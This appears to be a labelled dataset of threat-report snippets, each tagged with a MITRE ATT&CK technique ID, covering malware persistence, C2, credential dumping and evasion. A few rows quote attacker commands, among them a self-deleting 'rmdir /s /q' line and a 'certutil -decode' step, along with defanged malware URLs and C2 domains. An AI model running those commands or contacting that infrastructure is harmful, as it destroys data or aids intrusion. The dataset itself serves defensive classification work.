text,label
can deobfuscate packed binaries in memory.,T1140
the HTTP C2 Communication section.,T1071.001
by passing the file path to be encrypted as an argument.,T1027
has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.,T1112
And that Run key references a different Registry key,T1547.001
Code responsible for downloading cron_script file,T1105
has deleted itself after creating a service as well as deleted a temporary file when the system reboots.,T1070.004
has named component DLLs RapportGP.dll to match those used by the security company Trusteer.,T1036.005
creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().,T1106
has the ability to write collected data to a file created in the ./LOGS directory.,T1074.001
One persistence mechanism used by  is to register itself as a scheduled task.,T1053.005
has used Google Chrome's decryption and extraction operations.,T1140
has been packed with multiple layers of encryption.,T1027
malware can decode contents from a payload that was Base64 encoded and write the contents to a file.,T1140
can read specific registry values.,T1012
has downloaded additional files and tools from its C2 server.,T1105
The current system username,T1033
can upload and download files to the victims machine.,T1105
modified the Registry to perform multiple techniques through the use of .,T1112
can obtain the name of the logged-in user on the victim.,T1033
has installed a Windows service to maintain persistence on victim machines.,T1543.003
can use a module to log keystrokes.,T1056.001
The  malware communicates to its command server using HTTP with an encrypted payload.,T1071.001
The  loader implements itself with the name Security Support Provider a legitimate Windows function. Various  .exe files mimic legitimate file names used by Microsoft Symantec Kaspersky Hewlett-Packard and VMWare.  also disguised malicious modules using similar filenames as custom network encryption software on victims.(Citation: Symantec Remsec IOCs),T1036.005
has sent spearphishing emails with malicious hta file attachments.,T1566.001
can delete itself following the successful execution of a follow-on payload.,T1070.004
can capture keystrokes on a compromised host.(Citation: Kroll Qakbot June 2020)(Citation: Trend Micro Qakbot December 2020),T1056.001
PowerShell de-obfuscation routine,T1140
capture screenshot,T1113
uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.,T1573.001
Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic,T1090
has modified registry keys of ComSysApp Svchost and xmlProv on the machine to gain persistence.(Citation: Medium KONNI Jan 2020) ,T1112
obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.,T1027
"A new batch file, localdisk.bat, was also executed",T1059.003
"With the domain names decrypted, the DLL Loader decrypts 10 strings that should be URIs to be appended to the domains.",T1140
has called GetCurrentProcess.,T1057
has the ability to install itself as a service.,T1543.003
has decompressed data received from the C2 server.,T1140
can collect data from a compromised host.,T1005
has the ability to download VBS files to the target computer.,T1105
masks your traffic to a certain website by masquerading it as a different domain.,T1090
has used HTTP for C2 communications.,T1071.001
C:\Windows\System32\cmd.exe /c,T1059.003
a batch file,T1059.003
"Finally, the first DLL adds the registry key “SysRat,” at SoftWare\Microsoft\Windows\CurrentVersion\Run, to ensure the malware is executed at startup",T1547.001
has used RDP for lateral movement.,T1021.001
The batch file eyewear.bat then executed two commands,T1059.003
it locates a packed and compressed payload,T1027
The  command and control protocol's data stream can be encrypted with AES-CBC.,T1573.001
is encrypted using single-byte XOR.,T1027
source code used generic variable names and pre-obfuscated strings and was likely sanitized of developer comments before being added to . ,T1027
SetRegistryValue,T1112
systeminfo,T1082
has checked for the LogMein event log in an attempt to encrypt files in remote machines.,T1219
During  the threat actors used WMI to load  onto additional hosts within a compromised network.,T1570
can enumerate attached drives.,T1082
uses vncDll module to remote control the victim machine.(Citation: ESET Trickbot Oct 2020),T1219
the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations:•    CVE-2023-21839      Oracle WebLogic Server RCE [13]•    CVE-2021-3129      Laravel debug mode RCE [14]•    CVE-2020-2551      Oracle WebLogic RCE [15]•    CVE-2021-44228     Apache Log4j [16],T1190
exfiltrates collected information from its r1.log file to the external C2 server. ,T1041
can scan a directory to identify files for deletion.,T1083
using a variety of encryption schemes and symmetric keys.,T1573.001
communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks. ,T1573.001
can create a new service named msamger (Microsoft Security Accounts Manager).,T1543.003
encrypted gathered information with a combination of shifting and XOR using a static key.,T1027
has deployed a modified version of Invoke-Ngrok to expose open local ports to the Internet.,T1090
can run cmd through an IRC channel.,T1059.003
enter this directly in the host OS command shell.,T1059.003
has used spearphishing emails to deliver  as a malicious attachment.,T1566.001
can use `rundll32` for execution of its components.,T1218.011
"SpyNote RAT captured the device’s screen activities along with audio using the  MediaProjectionCallback functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named ""video.mp4"" as shown in the following screenshot:          Figure 5 : Output File     SMS stealing  SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot below:          Figure 6: Reading SMS messages     Stealing contacts The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the spyware",T1113
to download the second stage.,T1105
"The HTML attachments used HTML Smuggling to drop a password protected, zipped Windows Script File (WSF).",T1027
"Following the payload header, the malware expects blocks of
encrypted data with 8-byte headers.",T1027
a reverse proxy,T1090
has the ability to delete folders and files from a targeted system.,T1070.004
func_GetProcessor(),T1082
A scheduled task was then created using this same DLL.,T1053.005
uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.,T1140
can acquire network configuration information like DNS servers public IP and network proxies used by a host.(Citation: Github PowerShell Empire),T1016
has used scheduled tasks to establish persistence for various malware it uses including downloaders known as HARDTACK and SHIPBREAD and .,T1053.005
Disables Windows Defender Attack Surface Reduction (ASR) rules,T1562.001
can use a variant of the sysprep UAC bypass.,T1548.002
encrypts all strings using RC4 and bundles all functionality into a single function call. ,T1027
can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary. ,T1543.003
has searched local system resources to access sensitive documents.,T1005
has added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size.,T1027
has attempted to brute force credentials to gain access.,T1110
has a module to perform brute force attacks on a system. ,T1110
the threat actors checked running processes on the accessed hosts via taskmanager,T1057
can download files from C2.,T1105
During  the threat actors used `wmiexec.vbs` to run remote commands.,T1047
has infected victims via malicious attachments.,T1204.002
has the ability to identify any anti-virus installed on the infected system.,T1518.001
can store a file named `mpsvc.dll` which opens a malicious `mpsvc.mui` file in the same folder as the legitimate Microsoft executable `MsMpEng.exe` to gain execution.(Citation: Trend Micro DRBControl February 2020),T1574.002
has used  to register a scheduled task to execute malware during lateral movement.,T1053.005
can check for the presence of specific security products.,T1518.001
Downloads the miner and watcher.,T1105
The malware proceeds to decrypt and embedded configuration of 128 bytes using a simple XOR routine,T1140
"Retrieves  system default language, timezone and OS version",T1082
cmd.exe /c,T1059.003
proceeded to dump LSASS memory,T1003.001
"By running SSH on the server in a compromised network, attackers can come back to the network whenever they want",T1016
prepends a copy of itself to the beginning of an executable file while maintaining the name of the executable.(Citation: wardle evilquest partii),T1036.005
"the exfiltration of data on the system, such as OS, Processor (architecture),",T1082
Propagation through GPO,T1484.001
can execute getinfo to enumerate the computer name and OS version of a compromised system.,T1082
Many strings in  are obfuscated with a XOR algorithm.(Citation: F-Secure Sofacy 2015)(Citation: ESET Sednit Part 1),T1027
has used schtasks.exe for lateral movement in compromised networks.,T1053.005
has a module to create delete or modify Registry keys.,T1112
An  macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.(Citation: Unit 42 Sofacy Feb 2018),T1140
used HTTP for C2 communications.  also used an HTTP malware variant to communicate over HTTP for C2.(Citation: FireEye APT19),T1071.001
can use HTTP and HTTPS in C2 communications.(Citation: Talos Promethium June 2020),T1071.001
can delete files written to disk.(Citation: FireEye Know Your Enemy FIN8 Aug 2016),T1070.004
uses Windows API functions to execute files,T1106
Monitoring file system events to collect new and modified files.,T1005
is capable of writing a file to the compromised system from the C2 server.,T1105
has the ability to initiate keylogging.,T1056.001
"It calls OpenProcess on lsass.exe with access flag set to VM_READ, and looks for the modules wdigest.dll and lsasrv.dll loaded in the lsass.exe process.",T1003.001
has used POST requests and HTTPS for C2 communications.(Citation: Kaspersky Dridex May 2017),T1071.001
can run shellcode it injects into a newly created process.,T1055
has relied upon a user opening an ISO file to enable execution of malicious shortcut files and DLLs.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)(Citation: Cybereason Bumblebee August 2022),T1204.002
During  the threat actors used `ipconfig` `nbtstat` `tracert` `route print` and `cat /etc/hosts` commands.,T1016
can be executed using rundll32.exe.,T1218.011
download further malware payloads,T1105
"In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.     Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration",T1047
can be used to embed payload data within a new image file.,T1027
has been distributed via malicious Microsoft Office documents within spam emails.,T1566.001
a batch file,T1059.003
actors to execute directory traversal attacks,T1083
can capture keystrokes on a compromised host.,T1056.001
"using other known vulnerabilities for initial access, i.e. vulnerabilities in Citrix gateway devices",T1190
to persist in target environments and deploy additional tools.,T1105
decoding function,T1140
variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.,T1036.005
the payload decryption key,T1140
can gather the IP address from the victim's machine.,T1016
attackers also exploited vulnerabilities such as PrintNightmare to escalate privileges,T1068
[sic] section of a decoded FlowCloud config,T1140
queries Registry values as part of its anti-sandbox checks.(Citation: FinFisher Citation),T1012
antivirus check script,T1518.001
has used the Windows Command Shell and batch scripts for execution on compromised hosts.,T1059.003
"the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.",T1078
has executed downloaded DLLs with rundll32.exe.,T1218.011
has dropped malicious files into the startup folder `%AppData%\Microsoft\Windows\Start Menu\Programs\Startup` on a compromised host in order to maintain persistence.,T1547.001
has collected the user name from a compromised host using `GetUserNameA`.,T1033
uses HTTP for C2 communications.,T1071.001
Decryption of the config buffer in the Forked Loader.,T1140
is a batch script,T1059.003
The output is then parsed to the targeted process ID with the help of tasklist filters.,T1057
During  the threat actors used HTTP GET requests for C2.,T1071.001
decrypts and executes in memory,T1140
uses encoded strings in its process kill list. ,T1027
After data is collected by  malware it is exfiltrated over the existing C2 channel.,T1041
"Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes",T1105
can gather information about the user on a compromised host.,T1033
can download and execute an arbitary executable.,T1105
has the ability to use TCP sockets to send data and ICMP to ping the C2 server.(Citation: BlackBerry CostaRicto November 2020),T1095
keylogging,T1056.001
has a command to gather the username from the system.,T1033
"Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system",T1105
has the ability to deploy a reconnaissance module to retrieve a list of the active processes.,T1057
can use GetCurrentProcessId for process discovery.,T1057
encrypts C2 traffic using an XOR/ADD cipher.,T1573.001
During  the threat actors enabled HTTP and HTTPS listeners.,T1071.001
can use  for propagation on Windows hosts within intranets.,T1570
This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc,T1105
performed password brute-force attacks on the local admin account.,T1110
can disable Security Center functions like anti-virus.(Citation: TrendMicro DarkComet Sept 2014),T1562.001
can execute commands via the command line utility.,T1059.003
has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host. ,T1105
has the ability to execute commands through  on a compromised host.,T1059.003
has used e-mails with malicious documents to lure victims into installing malware.(Citation: TrendMicro BlackTech June 2017) ,T1204.002
"DLL sideloading,",T1574.002
has created LNK files in the Startup folder to establish persistence.,T1547.001
has the ability to decrypt an embedded .NET module.,T1140
can self-propagate in the network by using the legitimate PsExec utility,T1570
has used process hollowing in iexplore.exe to load the  implant.,T1055
malware has injected a Cobalt Strike beacon into Rundll32.exe.,T1055
"a remote service was created with random alphanumeric characters, service name and service file name",T1543.003
has encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key.,T1573.001
has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.,T1055
can delete files via `C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q`.,T1070.004
exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.(Citation: Cybereason Soft Cell June 2019),T1190
can query the Registry to determine if it has already been installed on the system.,T1012
using DeviceControl API methods,T1106
which is stored immediately before the encrypted config block.,T1027
has a XOR-encoded payload.,T1027
has used `cmd` for execution on an infected host.,T1059.003
has used an encrypted configuration file for its loader.,T1027
can send victim data to an actor-controlled C2 server.,T1041
has the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data.,T1573.001
has lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics.,T1204.002
has used HTTP POST requests to communicate with its C2 server to receive commands. ,T1071.001
terminates anti-malware processes if theyre found running on the system.,T1562.001
starts using the Cobalt Strike beacon for remote access and command and control.,T1219
retrieves the same files from the C2,T1105
can collect the victim username.,T1033
has been XOR-encoded.,T1027
During  the threat actors obtained files and data from the compromised network.,T1005
can set a Registry key to determine how long it has been installed and possibly to indicate the version number.,T1112
has used a scheduled task for persistence.,T1053.005
During  threat actors used the `CreateProcessA` and `ShellExecute` API functions to launch commands after being injected into a selected process.,T1106
has used tools to identify running processes on the victim's machine.,T1057
captures and DES-encrypts credentials before writing the username and password to a log file C:\log.txt.,T1056.001
has collected from a victim machine the system name processor information OS version and disk information including type and free space available.,T1082
"Get the total RAM size of compromised host by executing ""SELECT * FROM Win32_OperatingSystem"" and look for ""TotalVisibleMemorySize""",T1082
These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.,T1090
has exploited the CVE-2016-0167 local vulnerability.(Citation: FireEye Fin8 May 2016),T1068
It uses a different custom packer,T1027
"Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.",T1082
"When executed on a Windows Domain Controller (DC), the ransomware automatically creates a Group Policy, spreading itself to other machines within the domain.",T1484.001
distributing phishing emails containing malicious files,T1566.001
has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.,T1059.003
using a batch file named find.bat.,T1059.003
activity from a network proxy tool,T1090
brute forcing,T1110
Packed DLL analysis,T1027
has been known to establish persistence by adding programs to the Run Registry key.,T1547.001
has lured victims into executing malicious files.,T1204.002
has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.,T1110
has the ability to steal documents from the local system including the print spooler queue.,T1005
may query the Registry by running reg query on a victim.,T1012
has the ability to launch files using ShellExecute.,T1106
can delete created files from a compromised system.,T1070.004
exploits CVE-2016-4117 to allow an executable to gain escalated privileges.,T1068
"Cadelspy initially arrives on the computer as a dropper, which downloads two installer components catering to whether the victim is running a 32-bit or 64-bit system",T1082
payloads are usually shellcode encrypted with a rolling XOR key.,T1027
"the sideloaded DLL),",T1574.002
ease of batch file execution.,T1059.003
cmd.exe /C whoami,T1033
has used process hollowing shellcode to target a predefined list of processes from %SYSTEM32%.,T1055
has used valid compromised credentials to gain access to victim environments.,T1078
During  threat actors disabled anti-virus and anti-spyware tools in some instances on the victims machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.,T1562.001
"23 Take screenshot, temporarily store it as TPX499.dat, and upload it to the C2",T1113
has leveraged CreateProcessW() call to execute the debugger.,T1106
has exfiltrated stolen files to its C2 server.,T1041
uses the rem reg query command to obtain values from Registry keys.,T1012
can make modifications to Registry keys. ,T1112
The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code):  Figure 10,T1140
has used `WinHTTP` `CreateProcess` and other APIs for C2 communications and other functions.,T1106
it then checks the amount of IPs found in the ARP table,T1016
using the callback function pointer in CallWindowProc,T1106
has the ability to enumerate running processes on a compromised host.,T1057
To deobfuscate the document the tool xlmdeobfuscator was used with the following output.,T1140
has used scheduled tasks to establish persistence.,T1053.005
"malware
also checks that the operating system version",T1082
a malicious template file is downloaded and executed,T1105
has the ability to delete files from a compromised host.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) ,T1070.004
has the ability to use HTTP in communication with C2.,T1071.001
has communicated with C2 over HTTPS.,T1071.001
includes keylogging capabilities for Windows Linux and macOS systems.,T1056.001
can use TCP for C2 communications.,T1095
-ReflectivePEInjection” that facilitates reflective PE injection using PowerShell.,T1055
"In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle",T1566.001
can execute commands on victims.,T1059.003
has a plugin designed to obtain a list of processes.(Citation: Threatpost Lizar May 2021),T1057
Executable that accepts an executable as an argument and executes it with hidden console,T1059.003
has packed and encrypted its loader module.,T1027
can perform credential dumping from memory to obtain account and password information.,T1003.001
Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.,T1027
", staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",T1074.001
collected hostname OS version and device uptime.(Citation: FireEye SUNBURST Backdoor December 2020),T1082
During  the threat actors uploaded stolen files to their C2 servers.,T1041
has been observed injecting in to Explorer.exe and other processes. (Citation: Picus Emotet Dec 2018)(Citation: Trend Micro Banking Malware Jan 2019),T1055
During  the threat actors used  to collect information on targeted hosts.,T1082
domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles,T1090
persists using a scheduled task that executes every minute.,T1053.005
replace the “ServiceManager.exe” file from the driver folder with a malicious file to trick the driver into running the tainted file,T1036.005
These credentials used appear to be default credentials for IoT devices.,T1078
can identify the IP address and user domain on the target machine.(Citation: PWC WellMess July 2020),T1016
has the ability to search for specific files.,T1083
"each data byte in the HTTP based C2 communication,",T1071.001
func_ListProcesses(),T1057
uses API calls to enumerate the infected system's ARP table.,T1016
has the ability to connect to a remote host in order to upload and download files.,T1105
can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.,T1071.001
Most  samples maintain persistence by setting the Registry Run key SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ in the HKLM or HKCU hive with the Registry value and file name varying by sample.,T1547.001
by capturing the CredEnumerateA API.,T1106
Victim system reconnaissance The code then tries to obtain the victim’s public IP via “https://api.ipify.org/”,T1016
the embedded compressed binaries,T1027
cyber actors use the VPS as well as small office and home office (SOHO) devices as operational nodes to evade detection.,T1090
can delete files from a compromised host.,T1070.004
Bypass UAC,T1548.002
"Malicious Document   Decoy Document  The attack starts with a spear-phishing email containing the HWP document named ""미북 정상회담 전망 및 대비.hwp"" (Prospects for US-North Korea Summit .hwp)",T1566.001
During  the threat actors used the legitimate Windows services `IKEEXT` and `PrintNotify` to side-load malicious DLLs.,T1574.002
AnyDesk and its installation as a service was used,T1219
is able to delete the Security Descriptor (`SD`) registry subkey in order to hide scheduled tasks.,T1112
can download and run batch files to execute commands on a compromised host.,T1059.003
payload has been encrypted with a key that has the hostname and processor family information appended to the end.,T1027
To move laterally on a victim network  has used credentials stolen from various systems on which it gathered usernames and password hashes.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019),T1078
has modified the registry key SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System and added the ransom note. ,T1112
has used HTTPS and HTTP GET requests with custom HTTP cookies for C2.(Citation: MSTIC NOBELIUM Mar 2021),T1071.001
is capable of capturing keystrokes on victims.,T1056.001
can list running processes on the system.,T1057
can utilize cmd.exe to execute commands in a victim's environment.,T1059.003
has deployed malware that has copied itself to the startup directory for persistence.,T1547.001
kills antimalware running process.,T1562.001
has the ability to delete files.,T1070.004
cracking browser sensitive information like passwords,T1110
has used brute force attempts against a central management console as well as some Active Directory accounts.,T1110
bat script:,T1059.003
has used C2 infrastructure to receive exfiltrated data.,T1041
has used known administrator account credentials to execute the backdoor directly.,T1078
has downloaded additional malware to execute on victim systems.(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019),T1105
has obfuscated code using RC4 XOR and RSA.(Citation: Securelist Darkhotel Aug 2015),T1027
can download remote files onto victims.,T1105
uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.,T1027
can retrieve payloads from the C2 server.,T1105
has the ability to execute shell commands.,T1059.003
can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.,T1090
has gathered information about running processes.(Citation: TrendMicro Ursnif Mar 2015),T1057
The task is used to start an IronPython script,T1053.005
used  to collect usernames from the system.,T1033
"searches for and exfiltrates the following information:
OS architecture
Built-in admin
Domain host name
Hostname
Local admin
Operating system
Screen resolution",T1082
has used cmd.exe to run a PowerShell script. ,T1059.003
uses custom batch scripts to execute some of its components.,T1059.003
passing the path to the encrypted component as a parameter.,T1027
has a module to download and execute files on the compromised machine.(Citation: CIRCL PlugX March 2013),T1105
can gather system information from the victims machine such as the OS version machine name and drive information.(Citation: Unit42 Cannon Nov 2018),T1082
exploit targeting a public-facing appliance vulnerability.,T1190
has used cmd.exe to run its self deletion routine.,T1059.003
has exfiltrated files stolen from local systems.,T1005
injects into the svchost.exe process,T1055
a brute-force attack of a Remote Desktop Protocol on a public-facing server.,T1110
has the ability to identify the username on a compromised host.,T1033
"Proxying RDP traffic via a processes such as a Cobalt Strike beacon reduces the exposure of the threat actor’s own infrastructure, and blends RDP activity to those of internal hosts on the network.",T1090
"utilising similar API calls,",T1106
"The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers",T1027
the user will be encouraged to download a malicious installer,T1204.002
"This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems",T1033
has a command to collect victim system information including the system name and OS version.,T1082
has the ability to leverage local and remote exploits to escalate privileges.,T1068
the rootkit module is decrypted,T1140
has decrypted encrypted strings.,T1140
has used encoded PowerShell commands.,T1027
"Technique Description   Fan Check The Trojan will perform the following WMI query:   Select * from Win32_Fan   According to MSDN, this query should return a class that provides statistics on the CPU fan",T1047
"Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document",T1566.001
During  threat actors installed  in the Startup folder and disguised it as `mssync.exe`.,T1036.005
can open a remote command-line interface and execute commands.(Citation: PaloAlto NanoCore Feb 2016)  uses JavaScript files.,T1059.003
This build tool encrypts the binary’s strings with a fresh key for each build,T1027
created and read from a file with a fake JPG header and its payload was encrypted with a simple rotating XOR cipher.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Check Point Sunburst Teardrop December 2020),T1027
Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process.(Citation: GitHub PowerSploit May 2012),T1057
can query the Registry for keys added to execute COM hijacking.,T1012
exfiltrates data to Google Drive storage,T1041
The malware performs the following activities:  Builds imports by dynamically loading APIs Decrypts strings needed for control server communications Performs control server communications Handles commands issued by the control server Uninstalls self from the system  The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress(),T1041
"deletes,",T1070.004
creates a scheduled task on the system that provides persistence.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Totbrick Oct 2016),T1053.005
has the ability to identify the domain of the compromised host.,T1016
Credential theft and password spraying,T1110
"several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable",T1003.001
"From the two phishing emails, both attachments contain similar malware.",T1566.001
They then proceeded to dump credentials from the LSASS process on the host.,T1003.001
After deobfuscation,T1140
backdoor deletes files after they have been successfully uploaded to C2 servers.,T1070.004
can execute PE files in the address space of the specified process. ,T1055
"The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system",T1021.001
uses PsExec to modify the system registry parameter MaxMpxCt,T1112
can use .NET framework APIs,T1106
the attacker-controlled server through an HTTP POST request,T1071.001
has used malware that can collect the victims username.(Citation: Securelist MuddyWater Oct 2018),T1033
systeminfo,T1082
creates several tasks for later execution to continue persistence on the victims machine.,T1053.005
collects the hostname of the victim machine.,T1082
has relied on users mounting and executing a malicious DMG file.(Citation: Carbon Black Shlayer Feb 2019),T1204.002
captures keystrokes.,T1056.001
can rename its running process to [kworker:0/1] to masquerade as a Linux kernel thread.  has also named RC scripts used for persistence after WatchGuard artifacts.,T1036.005
has used RDP connections to move across the victim network.(Citation: PWC Cloud Hopper April 2017),T1021.001
the victim’s hostname is captured in this logon event,T1082
"The actors were able to proxy [T1090] RDP sessions,",T1021.001
may collect network configuration data by running ipconfig /all on a victim.,T1016
has encrypted strings with RC4.,T1027
